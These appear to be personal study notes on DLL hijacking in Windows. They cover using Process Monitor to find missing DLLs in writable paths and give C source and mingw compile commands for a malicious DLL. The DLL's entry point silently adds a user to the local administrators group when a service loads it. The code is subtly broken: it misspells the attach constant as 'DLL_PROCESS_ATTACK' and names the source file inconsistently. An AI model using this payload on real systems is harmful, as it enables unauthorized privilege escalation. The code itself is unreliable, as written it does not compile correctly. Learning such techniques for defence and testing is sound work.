Dll Hijacking 

DLL - Dynamic Link library. they are like executables but they are not directly executes. 
      DLL is shared libraries contains functions, classes, and resoureses and variables. dll run with executables. 

Case in DLL Hijacking 
 
We looking for a specific instance, now when a windows environments starts up a service or an application 
it looks for dlls. Now if the dll doesn't exists then we can get malicious with it. 

Looking for a path which is writable.
and the dll is not present. 

tool used : procmon : process monitor 

set the filter like 

1. result is NAME NOT FOUND 
2. path ends with .dll 

Now find the DLL whose path is writeable so that we can replace this dll 

windows_dll.c : 

Compiling Options : 


# For x64 compile with : x86_64-w64-mingw32-gcc window_dll.c -shared -o output.dll 
# For x86 compile with : i686-w64-mingw32-gcc window_dll.c -shared -o output.dll 
 

#include<windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved ){
	if(dwReason == DLL_PROCESS_ATTACK){
		system("cmd.exe /k net localgroup administrators user  /add");
		ExitProcess(0);
	}
	return true;
	
}
 
now save this compiled dll to that location where error occurs 

start the service again and then out payload get executed
